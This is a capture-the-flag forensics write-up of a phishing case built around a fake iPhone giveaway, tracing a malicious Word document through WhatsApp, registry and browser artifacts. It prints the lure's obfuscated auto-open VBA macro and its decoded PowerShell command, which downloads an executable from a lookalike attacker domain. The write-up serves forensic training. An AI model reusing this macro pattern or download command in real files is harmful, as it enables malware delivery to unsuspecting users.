---
title: "Cyberdefenders · Digital Forensics · Phishy"
date: 2023-08-12T19:16:00+03:00
draft: false
---

The scenario:

> A company’s employee joined a fake iPhone giveaway. Our team took a disk image of the employee's system for further analysis.
As a soc analyst, you are tasked to identify how the system was compromised.

## Abstract

In this article, I investigate a cyber incident involving a fake iPhone giveaway that targeted an employee at a company. As a SOC analyst, my mission is to determine how the system was compromised. Through careful analysis, I uncover the victim machine's hostname, identify the messaging app installed as WhatsApp, and trace the malicious download URL used by the attacker. 

The investigation reveals that the attacker used obfuscated macros in a document to execute a program named "Iphone.exe," downloaded from "http[:]//appIe.com/Iphone.exe." The malware is identified as a Meterpreter trojan created using the Metasploit framework. The attacker's IP address is found to be 155.94.69.27. Moreover, I discover the URL of the login page used in the fake giveaway as "http[:]//appIe.competitions.com/login.php," and the password submitted to this page is obtained using the PasswordFox tool. Here is why you should to raise awareness against phishing, consequences could be harmfull.

![Illustration of an old hook.](/img/write-up/hook.jpg)

<figcaption>Illustration of an old hook.</figcaption>

## Q1. What is the hostname of the victim machine?

Autopsy seems to not support the AD1 format. So I extracted the `SYSTEM` Windows Registry located at `Windows/System32/config/` using FTKImager. After, you can open it with various tools such as [RegistryExplorer from Eric Zimmerman](https://ericzimmerman.github.io/#!index.md) or [AccessData Registry Viewer](https://accessdata-registry-viewer.software.informer.com/download/).

According to [this post](https://superuser.com/questions/1539088/find-hostname-of-an-windows-image), the machine name is located here: `SYSTEM\ControlSet00X\Control\ComputerName\ComputerName`. The path is a little bit different but it's still the same logic: `WIN-NF3JQEU4G0T`.

## Q2. What is the messaging app installed on the victim machine?

Firstly, I tried to use [Autopsy](https://www.autopsy.com/) on this challenge, without success. Launching ingest module on the provided file only returns some email related strings, this is where I found the messaging app; WhatsApp. The "academic" method would be to look in `Program Files` and `Program Files (x86)` but there is nothing related to a messaging app. Sometimes, programs are installed directly on the user directory: `Users/Semah/AppData/Local/`, here you can find the WhatsApp directory.

## Q3. The attacker tricked the victim into downloading a malicious document. Provide the full download URL.

Firstly, I extracted all the WatsApp databases located at: `Users/AppData/Roaming/WhatsApp/Databases` and opened it with [sqliteviewer.app](https://sqliteviewer.app/). I found a conversation inside `msgstore.db > message_ftsv2` with this message: 

> okay you can check this file below :  https : / / drive.google.com / file / d / 1l1xn6r - za4w1me2uze8lxh45gfhsw66d / view ? usp = sharing readme.txt https : / / drive.google.com / file / d / 1l1xn6r - za4w1me2uze8lxh45gfhsw66d / view ? usp = sharing & usp = embed_facebook

Unfortunately, this is not the answer.

I finally found this fantastic tool: [WhatsApp Viewer](https://andreas-mausch.de/whatsapp-viewer/) which is very easy to use. When I opened the `msgstore.db`, the tool found an another discussion with the answer: `http[:]//appIe.com/IPhone-Winners.doc`. I wanted to know why I was unable to find theses messages. In fact, the messages was located in... `message` table, I just didn't saw them because of the interface! Lesson learned, be carreful and look for the good tool first.

## Q4. Multiple streams contain macros in the document. Provide the number of the highest stream.

Using the [Oledump python script](https://blog.didierstevens.com/programs/oledump-py/), you can find that the highest stream which contains macro (marqued with the "M" letter in the output bellow), is 10.

```
python oledump_V0_0_75\oledump.py export-folder\IPhone-Winners.doc

  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      8473 '1Table'
  5:       501 'Macros/PROJECT'
  6:        68 'Macros/PROJECTwm'
  7:      3109 'Macros/VBA/_VBA_PROJECT'
  8:       800 'Macros/VBA/dir'
  9: M    1170 'Macros/VBA/eviliphone'
 10: M    5581 'Macros/VBA/iphoneevil'
 11:      4096 'WordDocument'
```

## Q5. The macro executed a program. Provide the program name?

First, you have to extract both of the macros:

```
$ python oledump_V0_0_75\oledump.py -s 10 -v export-folder\IPhone-Winners.doc

Attribute VB_Name = "iphoneevil"
Function lllllllll1l()
    Dim lllllllllll As String
    Dim llllllllll1 As String
    lllllllllll = Chr(97) [...] Chr(65)
    llllllllll1 = Chr(112) [...] Chr(100) & lllllllllll
    CreateObject(Chr(87) & Chr(83) & Chr(99) & Chr(114) & Chr(105) & Chr(112) & Chr(116) & Chr(46) & Chr(83) & Chr(104) & Chr(101) & Chr(108) & Chr(108)).Run llllllllll1, 0, True
End Function

$ python oledump_V0_0_75\oledump.py -s 9 -v export-folder\IPhone-Winners.doc

Attribute VB_Name = "eviliphone"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
Private Sub _
Document_open()
lllllllll1l
End Sub
```

The stream number 10 is obfuscated. I translated all the `Chr` function parameter into ASCII values and observed that it looks like base64. Here is the decoded payload (last line of the 10th stream) :

```
CreateObject(WScript.Shell).Run invoke-webrequest - Uri   'http://appIe.com/Iphone.exe' -OutFile 'C:\Temp\IPhone.exe' -UseDefaultCredentialÀ, 0, True
```

The malicious macro launch a downloading from the same domain as the user downloaded the infectied doc file, using Powershell.

## Q6. The macro downloaded a malicious file. Provide the full download URL.

Already answered in the previous question.

## Q7. Where was the malicious file downloaded to? (Provide the full path)

Already answered in the previous question.

## Q8. What is the name of the framework used to create the malware?

My antivirus gives me the answer as it deleted the file with a pop-up showing that the malware is a Meterpreter trojan. An other way is to calculate the Iphone.exe's hash and search on VirusTotal, you will see that the program is related to Meterpreter too. A third way is to extract the file and extract the strings inside, I'm pretty sure that you will find Meterpreter inside. Unfortunately my AV doesn't want to extract the file so I will consider this solution as valid too.

An internet research about "Meterpreter framework" gives the framework name: Metasploit.

## Q9. What is the attacker's IP address?

VT provides various IoCs related to this malware, like these IP addresses:

- 155.94.69.27

- 192.168.0.30	

- 192.229.221.95	

- 20.99.133.109	

- 23.216.147.76	

- 52.185.73.156	

Thanks to the answer pattern you can easily identifie the correct one. Otherwise, a string extraction should provides IP addresses too.

## Q10. The fake giveaway used a login page to collect user information. Provide the full URL of the login page?

I was stucked on this question for a while. I found the history database located at `C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile folder>\places.sqlite` into the `moz_places` table but when I wanted to open it with a SQLite viewer I didn't see the answer. I saw a weird domain named `https://for1.q21.ctfsecurinets.com` and when I opened the **same** file with Autopsy I saw the answer: `http://appIe.competitions.com/login.php`.

I don't know why both software didn't see the same data, maybe it's because Autopsy process the `places.sqlite` with other files but it's still weird because with Autopsy I don't see `https://for1.q21.ctfsecurinets.com`.

## Q11. What is the password the user submitted to the login page?

I used [PasswordFox](https://www.nirsoft.net/utils/passwordfox.html), selected the profile folder and opened it with the tool, the password is displayed on the screen.
